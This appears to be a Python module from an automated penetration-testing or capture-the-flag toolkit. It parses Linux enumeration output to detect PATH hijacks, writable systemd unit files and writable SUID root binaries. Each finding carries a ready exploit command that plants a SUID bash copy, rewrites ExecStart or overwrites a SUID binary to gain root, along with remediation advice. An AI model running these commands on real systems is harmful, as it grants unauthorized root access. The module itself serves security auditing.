"""More generalized Linux privesc-class detectors on top of the shell enum blob.

Together with `writable_root_paths.find_writable_root_exec`, these cover the
recurring "custom-box privesc" classes that a per-app module would keep re-
inventing:

* **PATH hijack in a root-run script** - a root cron/systemd command invokes a
  BINARY BY NAME (no absolute path) and the current PATH contains a writable
  directory ordered before the real binary.
* **Writable Systemd service unit** - the .service file itself is writable, so we
  can rewrite ExecStart to any command; a `systemctl daemon-reload && start`
  cycle (or the natural next start) runs it as the unit's User (often root).
* **Writable SUID root binary** - a SUID root binary is writable by us: replace
  it with a shell copy for instant root.

Pure functions over the enum text - the same `$ cmd\\noutput` block format the
session enum produces. Independent of any app.
"""

from __future__ import annotations

import re

from ..core.state import Finding, Severity

# Reuse the block splitter from writable_root_paths so the enum-blob format stays
# in one place.
from .writable_root_paths import _blocks

# Absolute-path candidates that appear in a cron/systemd line.
_ROOT_CRON_CMDS = re.compile(
    r"(?:^|\s)root\s+(.+)$|(?:^|;)\s*ExecStart[^=]*=\s*(.+)$", re.MULTILINE)
_ARG0_BAREWORD = re.compile(r"([A-Za-z][A-Za-z0-9_.-]{1,})\b")
# writable directory entries in a `-writable` listing (whole line = absolute dir).
_ABS_DIR = re.compile(r"^/[A-Za-z0-9._/-]+$")
# .service file line in the writable set.
_SVC_UNIT_RE = re.compile(r"^/(?:etc|lib|run|usr/lib)/systemd/system/[^/\s]+\.service$")


def _writable_paths(blocks: dict[str, str]) -> set[str]:
    out: set[str] = set()
    for cmd, body in blocks.items():
        if "-writable" not in cmd:
            continue
        for line in body.splitlines():
            p = line.strip()
            if _ABS_DIR.match(p):
                out.add(p)
    return out


def _env_path(blocks: dict[str, str]) -> list[str]:
    """The current user's PATH from an `env` block, split into directories."""
    for cmd, body in blocks.items():
        if not cmd.strip().startswith("env"):
            continue
        for line in body.splitlines():
            if line.startswith("PATH="):
                return line[5:].split(":")
    return []


def _root_bareword_commands(blocks: dict[str, str]) -> list[tuple[str, str]]:
    """(bareword-binary, mechanism-hint) pairs from root cron/systemd lines.

    A "bareword" is an argv[0] that has NO slash - i.e. resolved via PATH. Those
    are the ones a PATH hijack can steal.
    """
    hits: list[tuple[str, str]] = []
    for cmd, body in blocks.items():
        low = cmd.lower()
        if "cron" not in low and "execstart" not in low and ".service" not in low:
            continue
        mechanism = "cron" if "cron" in low else "systemd unit"
        for line in body.splitlines():
            for m in _ROOT_CRON_CMDS.finditer(line):
                cmd_str = (m.group(1) or m.group(2) or "").strip()
                if not cmd_str:
                    continue
                # First token = argv[0]. Skip if it starts with '/' (absolute).
                first = cmd_str.split()[0] if cmd_str.split() else ""
                if not first or first.startswith("/") or "/" in first:
                    continue
                bare = _ARG0_BAREWORD.match(first)
                if bare:
                    hits.append((bare.group(1), mechanism))
    return hits


def find_path_hijacks(enum_text: str) -> list[Finding]:
    """Where a root-executed bareword collides with a writable directory in PATH."""
    blocks = _blocks(enum_text)
    writable = _writable_paths(blocks)
    path = _env_path(blocks)
    out: list[Finding] = []
    seen: set[str] = set()
    if not path:
        return out
    for binary, mechanism in _root_bareword_commands(blocks):
        # Any writable directory ordered before the first real hit in PATH is a
        # hijack. We flag conservatively: any writable-and-in-PATH directory
        # means placing an executable named `binary` there could be picked up.
        writable_in_path = [d for d in path if d in writable]
        if not writable_in_path:
            continue
        key = f"{binary}:{writable_in_path[0]}"
        if key in seen:
            continue
        seen.add(key)
        out.append(Finding(
            title=f"PATH hijack: root runs '{binary}' via {mechanism}",
            severity=Severity.HIGH,
            description=f"root invokes '{binary}' with no absolute path via "
                        f"{mechanism}, and PATH contains a writable directory "
                        f"({writable_in_path[0]}). Drop an executable named "
                        f"'{binary}' there; it will run as root at the next "
                        "invocation.",
            evidence=f"bareword={binary}  writable_in_PATH={writable_in_path}",
            exploit=(f"cp /bin/bash {writable_in_path[0]}/{binary}; "
                     f"chmod 6755 {writable_in_path[0]}/{binary}"),
            remediation="Use absolute paths in privileged cron/systemd commands "
                        "and remove writable directories from root's PATH."))
    return out


def find_writable_service_units(enum_text: str) -> list[Finding]:
    """.service unit files that are writable by us -> rewrite ExecStart."""
    blocks = _blocks(enum_text)
    writable = _writable_paths(blocks)
    # Also scan the raw writable list (not directories) for .service unit paths.
    out: list[Finding] = []
    seen: set[str] = set()
    for cmd, body in blocks.items():
        if "-writable" not in cmd:
            continue
        for line in body.splitlines():
            p = line.strip()
            if _SVC_UNIT_RE.match(p) and p not in seen:
                seen.add(p)
                out.append(Finding(
                    title=f"Writable systemd unit file: {p}",
                    severity=Severity.HIGH,
                    description=f"The unit file '{p}' is writable. Rewrite "
                                "ExecStart to any command; the unit runs as its "
                                "configured User (often root) on the next start "
                                "or after `systemctl daemon-reload && "
                                "systemctl restart`.",
                    evidence=p,
                    exploit=(f"sed -i 's|ExecStart=.*|ExecStart=/bin/bash -c "
                             f"\"cp /bin/bash /tmp/rb; chmod 6755 /tmp/rb\"|' "
                             f"{p}; systemctl daemon-reload; "
                             f"systemctl restart $(basename {p} .service)"),
                    remediation="Restrict write access on systemd unit files to "
                                "root only."))
    # Silence unused-variable lint on `writable` (kept for symmetry / future use).
    _ = writable
    return out


def find_writable_suid_binaries(enum_text: str) -> list[Finding]:
    """SUID root binaries that we can also write to -> instant root."""
    blocks = _blocks(enum_text)
    writable = _writable_paths(blocks)
    suid_files: set[str] = set()
    for cmd, body in blocks.items():
        if "perm -4000" not in cmd:
            continue
        for line in body.splitlines():
            p = line.strip()
            if p.startswith("/"):
                suid_files.add(p)
    out: list[Finding] = []
    for p in sorted(suid_files & writable):
        out.append(Finding(
            title=f"Writable SUID root binary: {p}",
            severity=Severity.CRITICAL,
            description=f"'{p}' is SUID root AND writable by us. Overwrite it "
                        "with a bash copy (or any payload) - the next execution "
                        "runs as root.",
            evidence=p,
            exploit=f"cp /bin/bash {p}; chmod 6755 {p}; {p} -p -c 'id; cat /root/root.txt'",
            remediation="Drop the SUID bit or restrict write access on the file."))
    return out


def find_all(enum_text: str) -> list[Finding]:
    """Convenience: run every class detector in this module."""
    return (find_path_hijacks(enum_text)
            + find_writable_service_units(enum_text)
            + find_writable_suid_binaries(enum_text))
